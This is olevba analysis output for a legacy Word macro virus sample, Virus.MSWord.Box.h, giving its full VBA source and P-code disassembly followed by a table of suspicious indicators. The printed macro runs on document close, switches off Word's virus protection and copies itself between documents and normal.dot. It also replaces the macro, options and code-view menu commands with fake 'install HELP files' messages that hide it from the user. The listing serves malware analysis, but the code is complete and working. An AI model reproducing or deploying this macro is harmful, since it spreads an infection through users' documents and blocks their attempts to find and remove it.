olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MACRO.bas 
in file: Virus.MSWord.Box.h - OLE stream: 'Macros/VBA/MACRO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "巨集建立於 98/03/13，建立者 AAAA"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
Dim F$
Dim N$
On Error Resume Next
Options.VirusProtection = False
For ADVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ADVVC).Name = "MACRO" Then
DocumentInstalled = True
End If
Next
For NTVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(NTVVC).Name = "MACRO" Then
GlobalInstalled = True
End If
Next
If DocumentInstalled = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
Options.SavePropertiesPrompt = False
End If
If GlobalInstalled = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If

On Error Resume Next
Err = 0
F$ = WordBasic.[FileName$]()
N$ = "normal.dot"
Application.OrganizerCopy Source:=F$, Destination:=N$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](0)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](1)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](2)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](3)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False
On Error Resume Next
Err = 0
WordBasic.FileSaveAs Format:=1
F$ = WordBasic.[FileName$](4)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="MACRO", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False


exit_:

End Sub
Sub FileSave()
On Error GoTo exit_:
WordBasic.FileSave
exit_:
End Sub
Sub FileSaveAs()
On Error GoTo exit_:
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
exit_:
End Sub
Sub FileTemplates()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
Sub ToolsMacro()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
Sub ToolsOptions()
On Error Resume Next
Beep
On Error Resume Next
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue."
 .Button = msoButtonSetOK
 .Show
End With


End Sub
Sub ToolsCustomize()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
Sub ViewVBcode()
On Error Resume Next
Beep
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeBullets
 .Icon = msoIconTip
 .Button = msoButtonSetOkCancel
 .Heading = "CAUTION !!"
 .Text = "This option is not installed , please install the HELP files to continue. "
 .Button = msoButtonSetOK
 .Show
End With

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Box.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MACRO - 7103 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	Dim 
' 	VarDefn False
' Line #2:
' 	Dim 
' 	VarDefn N
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	StartForVariable 
' 	Ld ADVVC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #6:
' 	Ld ADVVC 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "MACRO"
' 	Eq 
' 	IfBlock 
' Line #7:
' 	LitVarSpecial (True)
' 	St DocumentInstalled 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	StartForVariable 
' 	Next 
' Line #10:
' 	StartForVariable 
' 	Ld NTVVC 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #11:
' 	Ld NTVVC 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "MACRO"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitVarSpecial (True)
' 	St GlobalInstalled 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	StartForVariable 
' 	Next 
' Line #15:
' 	Ld DocumentInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #16:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #17:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld GlobalInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	LitDI2 0x0000 
' 	St Err 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #28:
' 	LitStr 0x000A "normal.dot"
' 	St N$ 
' Line #29:
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld N$ 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #31:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #32:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #33:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	LitDI2 0x0000 
' 	St Err 
' Line #37:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #39:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	LitDI2 0x0000 
' 	St Err 
' Line #43:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #44:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #45:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	LitDI2 0x0000 
' 	St Err 
' Line #49:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #50:
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #51:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	LitDI2 0x0000 
' 	St Err 
' Line #55:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #56:
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0001 
' 	St False$ 
' Line #57:
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "MACRO"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #59:
' Line #60:
' Line #61:
' 	Label exit_ 
' Line #62:
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub FileSave())
' Line #65:
' 	OnError exit_ 
' 	BoS 0x0000 
' Line #66:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #67:
' 	Label exit_ 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub FileSaveAs())
' Line #70:
' 	OnError exit_ 
' 	BoS 0x0000 
' Line #71:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #72:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #73:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #74:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #75:
' 	Label exit_ 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub FileTemplates())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	ArgsCall Beep 0x0000 
' Line #80:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #81:
' 	Ld msoBalloonTypeBullets 
' 	MemStWith BalloonType 
' Line #82:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #83:
' 	Ld msoButtonSetOkCancel 
' 	MemStWith Button 
' Line #84:
' 	LitStr 0x000A "CAUTION !!"
' 	MemStWith Heading 
' Line #85:
' 	LitStr 0x004A "This option is not installed , please install the HELP files to continue. "
' 	MemStWith Then 
' Line #86:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #87:
' 	ArgsMemCallWith Show 0x0000 
' Line #88:
' 	EndWith 
' Line #89:
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ToolsMacro())
' Line #92:
' 	OnError (Resume Next) 
' Line #93:
' 	ArgsCall Beep 0x0000 
' Line #94:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #95:
' 	Ld msoBalloonTypeBullets 
' 	MemStWith BalloonType 
' Line #96:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #97:
' 	Ld msoButtonSetOkCancel 
' 	MemStWith Button 
' Line #98:
' 	LitStr 0x000A "CAUTION !!"
' 	MemStWith Heading 
' Line #99:
' 	LitStr 0x004A "This option is not installed , please install the HELP files to continue. "
' 	MemStWith Then 
' Line #100:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #101:
' 	ArgsMemCallWith Show 0x0000 
' Line #102:
' 	EndWith 
' Line #103:
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub ToolsOptions())
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	ArgsCall Beep 0x0000 
' Line #108:
' 	OnError (Resume Next) 
' Line #109:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #110:
' 	Ld msoBalloonTypeBullets 
' 	MemStWith BalloonType 
' Line #111:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #112:
' 	Ld msoButtonSetOkCancel 
' 	MemStWith Button 
' Line #113:
' 	LitStr 0x000A "CAUTION !!"
' 	MemStWith Heading 
' Line #114:
' 	LitStr 0x0049 "This option is not installed , please install the HELP files to continue."
' 	MemStWith Then 
' Line #115:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #116:
' 	ArgsMemCallWith Show 0x0000 
' Line #117:
' 	EndWith 
' Line #118:
' Line #119:
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub ToolsCustomize())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	ArgsCall Beep 0x0000 
' Line #124:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #125:
' 	Ld msoBalloonTypeBullets 
' 	MemStWith BalloonType 
' Line #126:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #127:
' 	Ld msoButtonSetOkCancel 
' 	MemStWith Button 
' Line #128:
' 	LitStr 0x000A "CAUTION !!"
' 	MemStWith Heading 
' Line #129:
' 	LitStr 0x004A "This option is not installed , please install the HELP files to continue. "
' 	MemStWith Then 
' Line #130:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #131:
' 	ArgsMemCallWith Show 0x0000 
' Line #132:
' 	EndWith 
' Line #133:
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub ViewVBcode())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	ArgsCall Beep 0x0000 
' Line #138:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #139:
' 	Ld msoBalloonTypeBullets 
' 	MemStWith BalloonType 
' Line #140:
' 	Ld msoIconTip 
' 	MemStWith Icon 
' Line #141:
' 	Ld msoButtonSetOkCancel 
' 	MemStWith Button 
' Line #142:
' 	LitStr 0x000A "CAUTION !!"
' 	MemStWith Heading 
' Line #143:
' 	LitStr 0x004A "This option is not installed , please install the HELP files to continue. "
' 	MemStWith Then 
' Line #144:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #145:
' 	ArgsMemCallWith Show 0x0000 
' Line #146:
' 	EndWith 
' Line #147:
' Line #148:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

